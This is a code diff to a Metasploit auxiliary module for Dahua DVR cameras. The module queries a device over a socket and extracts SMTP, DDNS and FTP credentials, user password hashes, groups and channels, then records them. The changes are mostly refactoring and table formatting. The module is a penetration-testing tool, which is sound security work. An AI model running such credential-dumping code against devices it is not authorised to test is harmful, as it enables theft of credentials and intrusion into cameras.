@@ -113,12 +113,12 @@ class Metasploit3 < Msf::Auxiliary
       print_status("  Destination Email: #{data[1]}") unless data[1].blank?
       mailserver = "#{mailhost[0]}"
       mailport = "#{mailhost[1]}"
+      muser = "#{data[5]}"
+      mpass = "#{data[6]}"
     end
-    return unless data[5].blank? && data[6].blank?
+    return if muser.blank? && mpass.blank?
     print_good("  SMTP User: #{data[5]}")
     print_good("  SMTP Password: #{data[6]}")
-    muser = "#{data[5]}"
-    mpass = "#{data[6]}"
     return unless mailserver.blank? && mailport.blank? && muser.blank? && mpass.blank?
     report_email_creds(mailserver, mailport, muser, mpass)
   end
@@ -136,13 +136,13 @@ class Metasploit3 < Msf::Auxiliary
     data.each_with_index do |val, index|
       next if index == 0
       val = val.split("&&")
-      ddns_service = "#{val[0]}"
-      ddns_server = "#{val[1]}"
-      ddns_port = "#{val[2]}"
-      ddns_domain = "#{val[3]}"
-      ddns_user = "#{val[4]}"
-      ddns_pass = "#{val[5]}"
-      ddns_table << ["#{ddns_service}", "#{ddns_server}", "#{ddns_port}", "#{ddns_domain}", "#{ddns_user}", "#{ddns_pass}"]
+      ddns_service = val[0]
+      ddns_server = val[1]
+      ddns_port = val[2]
+      ddns_domain = val[3]
+      ddns_user = val[4]
+      ddns_pass = val[5]
+      ddns_table << [ ddns_service, ddns_server, ddns_port, ddns_domain, ddns_user, ddns_pass ]
       unless ddns_server.blank? && ddns_port.blank? && ddns_user.blank? && ddns_pass.blank?
         ddns_table.print
         report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
@@ -165,8 +165,8 @@ class Metasploit3 < Msf::Auxiliary
       ftpuser.strip!
       ftppass.strip!
       unless ftpuser.blank? || ftppass.blank?
-        print_good(" Nas Server: #{server}")
-        print_good(" Nas Port: #{port}")
+        print_good(" NAS Server: #{server}")
+        print_good(" NAS Port: #{port}")
         print_good(" FTP User: #{ftpuser}")
         print_good(" FTP Pass: #{ftppass}")
         report_creds(
@@ -175,7 +175,7 @@ class Metasploit3 < Msf::Auxiliary
           user: ftpuser,
           pass: ftppass,
           type: "FTP",
-          active: true) if !server.nil? && !port.nil? && !ftpuser.nil? && !ftppass.nil?
+          active: true)
       end
     end
   end
@@ -184,18 +184,16 @@ class Metasploit3 < Msf::Auxiliary
     connect
     sock.put(CHANNELS)
     data = sock.get_once.split('&&')
-    disconnect
     channels_table = Rex::Ui::Text::Table.new(
       'Header' => 'Dahua Camera Channels',
       'Indent' => 1,
-      'Columns' => ['ID', 'Channels']
+      'Columns' => ['ID', 'Peer', 'Channels']
     )
     return unless data.length > 1
-    print_good("#{peer} -- camera channels:")
     data.each_with_index do |val, index|
       number = index.to_s
       channels = val[/([[:print:]]+)/]
-      channels_table << [ "#{number}", "#{channels}" ]
+      channels_table << [ number, peer, channels ]
     end
     channels_table.print
   end
@@ -209,12 +207,12 @@ class Metasploit3 < Msf::Auxiliary
     users_table = Rex::Ui::Text::Table.new(
       'Header' => 'Dahua Users Hashes and Rights',
       'Indent' => 1,
-      'Columns' => ['Username', 'Password Hash', 'Permissions', 'Description']
+      'Columns' => ['Username', 'Password Hash', 'Groups', 'Permissions', 'Description']
     )
     data.each do |val|
       usercount += 1
-      user, md5hash, rights, name = val.match(/^.*:(.*):(.*):.*:(.*):(.*):.*$/).captures
-      users_table << [user, md5hash, rights, name]
+      user, md5hash, groups, rights, name = val.match(/^.*:(.*):(.*):(.*):(.*):(.*):(.*)$/).captures
+      users_table << [user, md5hash, groups, rights, name]
       # Write the dahua hash to the database
       hash = "#{rhost} #{user}:$dahua$#{md5hash}"
       report_hash(rhost, rport, user, hash)
@@ -240,13 +238,12 @@ class Metasploit3 < Msf::Auxiliary
     groups_table = Rex::Ui::Text::Table.new(
       'Header' => 'Dahua groups',
       'Indent' => 1,
-      'Columns' => ['ID', 'Group']
+      'Columns' => ['ID', 'Peer', 'Group']
     )
-    print_good("#{peer} -- groups:")
     data.each do |val|
       number = "#{val[/(([\d]+))/]}"
       groups = "#{val[/(([a-z]+))/]}"
-      groups_table << [ number, groups ]
+      groups_table << [ number, peer, groups ]
     end
     groups_table.print
   end
